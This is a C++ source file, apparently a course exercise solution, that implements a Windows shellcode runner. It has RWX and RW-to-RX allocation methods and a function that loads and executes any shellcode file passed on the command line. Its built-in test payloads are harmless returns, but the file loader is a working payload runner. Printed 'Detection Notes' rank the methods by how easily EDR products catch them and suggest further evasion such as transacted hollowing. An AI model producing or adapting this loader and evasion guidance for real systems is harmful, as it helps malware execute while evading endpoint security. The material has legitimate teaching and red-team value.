/*
  Solution 02 — Shellcode Runner (Allocation + Execution Methods)
  ----------------------------------------------------------------
  Demonstrates three ways to load and execute shellcode, with timing
  measurements. Uses only safe no-op test shellcode (0xC3 = RET).

  Compile:
    g++ -std=c++17 -Wall -o sol02.exe sol02_shellcode_runner.cpp
  Usage:
    sol02.exe
*/

#include <windows.h>
#include <cstdio>
#include <cstring>
#include <vector>
#include <fstream>
#include <functional>

// ── Test shellcodes (safe: just return immediately) ───────────────────────────
static const BYTE TEST_SC[]  = { 0xC3 };                    // ret
static const BYTE TEST_SC2[] = { 0x31, 0xC0, 0xC3 };        // xor eax,eax; ret

// ── measureMs: time a function call in milliseconds ──────────────────────────
double measureMs(std::function<void()> fn) {
    LARGE_INTEGER freq, t0, t1;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t0);
    fn();
    QueryPerformanceCounter(&t1);
    return (double)(t1.QuadPart - t0.QuadPart) * 1000.0 / freq.QuadPart;
}

// ── runShellcode: RWX allocation (simple, detectable) ────────────────────────
// Allocates with PAGE_EXECUTE_READWRITE in one step.
// Detectable: EDRs watch for allocations that are immediately RWX.
bool runShellcode(const BYTE* sc, size_t len) {
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc RWX failed: %lu\n", GetLastError()); return false; }

    memcpy(mem, sc, len);
    FlushInstructionCache(GetCurrentProcess(), mem, len);

    auto fn = (void(*)())mem;
    fn();

    VirtualFree(mem, 0, MEM_RELEASE);
    return true;
}

// ── runShellcodeRW_RX: write then protect (better OPSEC) ─────────────────────
// Write as RW, then flip to RX. Avoids PAGE_EXECUTE_READWRITE.
bool runShellcodeRW_RX(const BYTE* sc, size_t len) {
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                               PAGE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc RW failed: %lu\n", GetLastError()); return false; }

    memcpy(mem, sc, len);

    DWORD oldProtect;
    if (!VirtualProtect(mem, len, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtect RX failed: %lu\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE); return false;
    }

    FlushInstructionCache(GetCurrentProcess(), mem, len);

    auto fn = (void(*)())mem;
    fn();

    VirtualFree(mem, 0, MEM_RELEASE);
    return true;
}

// ── runShellcodeFromFile: load shellcode from a binary file ──────────────────
bool runShellcodeFromFile(const char* path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) { printf("[-] Cannot open: %s\n", path); return false; }

    std::vector<BYTE> sc(std::istreambuf_iterator<char>(f), {});
    if (sc.empty()) { printf("[-] Empty file: %s\n", path); return false; }

    printf("[*] Loaded %zu bytes from %s\n", sc.size(), path);
    return runShellcodeRW_RX(sc.data(), sc.size());
}

int main(int argc, char* argv[]) {
    printf("=== Shellcode Runner — Educational Demo ===\n\n");

    // Method 1: RWX allocation
    printf("[1] RWX method (TEST_SC: 0xC3 = ret)\n");
    double ms1 = measureMs([&]() { runShellcode(TEST_SC, sizeof(TEST_SC)); });
    printf("    Returned in %.3f ms\n\n", ms1);

    // Method 2: RW → RX
    printf("[2] RW→RX method (TEST_SC2: xor eax,eax; ret)\n");
    double ms2 = measureMs([&]() { runShellcodeRW_RX(TEST_SC2, sizeof(TEST_SC2)); });
    printf("    Returned in %.3f ms\n\n", ms2);

    // Method 3: from file (optional)
    if (argc >= 2) {
        printf("[3] From file: %s\n", argv[1]);
        double ms3 = measureMs([&]() { runShellcodeFromFile(argv[1]); });
        printf("    Returned in %.3f ms\n\n", ms3);
    } else {
        printf("[3] From file: skip (no path argument)\n");
        printf("    Usage: %s <shellcode.bin>\n\n", argv[0]);
    }

    // Detection notes
    printf("=== Detection Notes ===\n");
    printf("  RWX allocation:    flagged by most EDRs (PAGE_EXECUTE_READWRITE at alloc)\n");
    printf("  RW->RX transition: less suspicious, but VirtualProtect to RX on unknown alloc\n");
    printf("                     is still monitored by advanced EDRs\n");
    printf("  Better OPSEC:      allocate in existing RX section, or use transacted hollow\n");

    return 0;
}
